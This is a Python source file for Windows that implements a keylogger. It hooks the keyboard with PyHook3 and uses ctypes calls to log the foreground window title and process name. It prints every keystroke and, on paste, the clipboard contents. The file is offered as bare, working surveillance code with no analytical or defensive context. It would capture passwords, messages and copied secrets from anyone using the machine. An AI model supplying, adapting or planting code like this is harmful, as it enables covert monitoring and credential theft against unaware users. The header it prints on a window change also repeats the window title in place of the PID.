from ctypes import *
import pythoncom
import PyHook3 as pyHook
import win32clipboard

user32 = windll.user32
kernel32 = windll.kernel32
psapi = windll.psapi
current_window = None

def get_current_process():
    global current_window, executable
    hwnd = user32.GetForegroundWindow()
    pid = c_ulong(0)
    user32.GetWindowThreadProcessId(hwnd, byref(pid))
    process_id = "%d" % pid.value # 获得进程 PID
    executable = create_string_buffer(b"\x00" * 512)
    h_process = kernel32.OpenProcess(0x400 | 0x10, False, pid)
    psapi.GetModuleBaseNameA(h_process, None, byref(executable), 512) # 获得进程名
    window_title = create_string_buffer(b"\x00" * 512)
    length = user32.GetWindowTextA(hwnd, byref(window_title), 512) # 获得窗口名
    current_window = window_title.raw.decode('utf-8', errors='replace')
    kernel32.CloseHandle(hwnd)
    kernel32.CloseHandle(h_process)

def key_event(event):
    global current_window
    if event.WindowName != current_window:
        current_window = event.WindowName
        get_current_process()
        print()
        print("[ PID: %s - %s - %s ]" % (current_window, executable.value.decode(), current_window))
        print()
    if event.Ascii > 32 and event.Ascii < 127:
        print(chr(event.Ascii), end='')
    else:
        if event.Key == "V":
            win32clipboard.OpenClipboard()
            pasted_value = win32clipboard.GetClipboardData()
            win32clipboard.CloseClipboard()
            print("[PASTE]-%s" % pasted_value)
        else:
            print("[%s]" % event.Key)
    return True

def key_logger():
    hooker = pyHook.HookManager()
    hooker.KeyDown = key_event
    hooker.HookKeyboard()
    pythoncom.PumpMessages()

if __name__ == '__main__':
    key_logger()
